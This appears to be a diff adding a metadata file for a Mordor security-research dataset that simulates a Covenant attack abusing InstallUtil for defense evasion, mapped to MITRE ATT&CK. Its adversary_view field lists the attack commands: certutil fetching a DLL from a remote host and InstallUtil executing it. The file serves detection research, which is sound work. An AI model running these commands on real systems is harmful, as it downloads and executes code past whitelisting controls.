@@ -1,0 +1,24 @@
+title: Covenant InstallUtil
+id: SD-191027223020
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/10/27
+platform: Windows
+mordor_environment: shire
+simulation_framework:
+  type: Interactive Session
+  name: Remote Desktop Protocol
+permissions_required:
+  - User
+description: This dataset represents adversaries proxying execution of code through InstallUtil, a trusted Windows utility.
+dataset:
+  type: small
+  file: https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_installutil.tar.gz
+attack_mappings:
+  - technique: T1118
+    tactics:
+      - TA0005
+      - TA0002
+analytics_validation:  
+adversary_view: |-
+  certutil.exe -urlcache -split -f http://172.18.39.8/util.dll C:\ProgramData\util.dll
+  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /u c:\ProgramData\util.dll
